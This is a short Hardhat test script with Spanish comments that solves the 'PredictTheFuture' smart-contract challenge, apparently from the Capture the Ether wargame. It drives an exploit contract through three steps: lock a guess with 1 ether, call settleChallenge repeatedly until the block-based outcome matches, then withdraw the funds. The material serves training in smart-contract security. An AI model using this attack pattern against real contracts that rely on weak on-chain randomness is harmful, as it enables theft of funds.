import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {

    // Attach to contracts
    const toa='0x79f9e9d358C6331B407664Df643591852DAb9514' //direccion contrato exploit
    const exploitContract = await (await ethers.getContractFactory("PredictTheFutureSolver")).attach(toa);

    const toa2="0x9a30F736df9E783FF2c8C68ce6B0c47B463b9F9C";
    const challengeContract = await (await ethers.getContractFactory("PredictTheFutureChallenge")).attach(toa2);
    
    //Llamar las siguientes 3 funciones por separado:
    //Primero llamar solo con un numero para adivinar (puede ser cualquier)
    //await exploitContract.lockNumber("0",{value: ethers.utils.parseEther("1.0")});
    //Segundo llamar settleChallenge hasta que no se revierta la trx (cada 15 segs aprox se cambia de bloque)
    //await exploitContract.settleChallenge();
    //Tercero, una vez adivinado el numero, sacar el ether del contrato a la cuenta
    await exploitContract.withdraw();
    expect(await challengeContract.isComplete()).to.be.true;
  });
});